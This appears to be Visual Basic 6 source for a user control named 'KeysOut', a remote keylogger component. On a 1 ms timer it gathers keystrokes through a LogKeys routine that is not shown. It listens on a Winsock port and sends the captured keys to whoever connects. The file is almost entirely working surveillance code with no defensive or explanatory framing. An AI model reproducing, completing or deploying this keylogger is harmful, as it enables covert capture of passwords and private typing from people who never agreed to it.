VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.UserControl KeysOut 
   ClientHeight    =   465
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3075
   ScaleHeight     =   465
   ScaleWidth      =   3075
   ToolboxBitmap   =   "KeysOut.ctx":0000
   Begin VB.Timer timState 
      Interval        =   1000
      Left            =   3225
      Top             =   -15
   End
   Begin VB.Timer timKeys 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   4080
      Top             =   0
   End
   Begin MSWinsockLib.Winsock Socket 
      Left            =   3660
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label lblLog 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "(Not Available)"
      Height          =   255
      Left            =   75
      TabIndex        =   0
      Top             =   105
      Width           =   2895
   End
End
Attribute VB_Name = "KeysOut"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
Private KeysLogged As String
'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
Public Event KeyError(ErrorDescription As String)
Public Event Disconnected()
'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
Private mvarLocalPort As Variant
'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||


'===============================
'   .RemoteIP
'===============================
Public Function RemoteIP()
    ' Returns Socket Remote IP
    RemoteIP = Socket.RemoteHostIP
End Function


'===============================
'   Timer
'===============================
Private Sub timKeys_Timer()

    '--------------------------------------
    ' This is how we log keys. A very basic
    ' procedure, called every tick.
    '--------------------------------------
    KeysLogged = LogKeys

    ' Send KeysLogged to Remote
    If Socket.State = 7 And KeysLogged <> "" Then
        Socket.SendData "020" & SP1 & KeysLogged
    End If

    ' Disable keylogging if socket disconnected.
    If Socket.State <> 7 Then timKeys.Enabled = False

End Sub


'===============================
'   Timer
'===============================
Private Sub timState_Timer()
Static LastState As Integer

    ' Visual Effect
    If Socket.State <> 7 Then
        lblLog = "Offline."
    Else
        lblLog = "Online."
    End If

    ' Trigger Events. Log State if
    ' State has changed since last.
    Select Case Socket.State
    Case 8: RaiseEvent Disconnected
    Case 9: RaiseEvent Disconnected
    Case Else:
        If LastState <> Socket.State Then lblLog = SocketState(Socket.State)
    End Select

    LastState = Socket.State

End Sub


'===============================
'   Resize
'===============================
Private Sub UserControl_Resize()
    UserControl.Width = 3075
    UserControl.Height = 465
End Sub


'===============================
'   .Listen
'===============================
Public Sub Listen()
    Socket.Close
    Socket.LocalPort = LocalPort
    Socket.Listen
    
    LocalPort = Socket.LocalPort
End Sub


'===============================
'   .Disconnect
'===============================
Public Function Disconnect()
    Socket.Close
End Function


'===============================
'   Connection Request (Socket)
'===============================
Private Sub Socket_ConnectionRequest(ByVal requestID As Long)
    
    Socket.Close                    '- Must close socket.
    Socket.Accept requestID         '- Accept incoming.
    Socket.SendData "010" & SP1     '- Data Ready ( Begin's Transfer Sequence )
    
    timKeys.Enabled = True

End Sub


'===============================
'   Data Arrival (Socket)
'===============================
Private Sub Socket_DataArrival(ByVal bytesTotal As Long)
On Error GoTo ErrSub
Dim iPacket As String
Dim iCom As String

    'BitsSecond = BitsSecond + bytesTotal

    ' Parse Packet
    Socket.GetData iPacket

    iCom = Word(iPacket, 1, SP1)
    iPacket = Right(iPacket, Len(iPacket) - Len(iCom) - 1)

    Select Case iCom
    'Case "010":
    End Select

Exit Sub
ErrSub:
    MsgBox Err.Number & " - " & Err.Description, vbCritical, "DATA ARRIVAL"
End Sub


'===============================
'   .WinsockState
'===============================
Public Function WinsockState()
    ' Return Socket State
    WinsockState = Socket.State
End Function


'===============================
'   Error (Socket)
'===============================
Private Sub Socket_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    RaiseEvent KeyError("Error " & Number & " (" & Description & ")")
End Sub


'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
'   CLASS OBJECT PROPERTY
'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
Public Property Let LocalPort(ByVal vData As Variant)
'Syntax: X.LocalPort = 5
    mvarLocalPort = vData
End Property
Public Property Set LocalPort(ByVal vData As Variant)
'Syntax: Set x.LocalPort = Form1
    Set mvarLocalPort = vData
End Property
Public Property Get LocalPort() As Variant
'Syntax: Debug.Print X.LocalPort
        LocalPort = mvarLocalPort
End Property
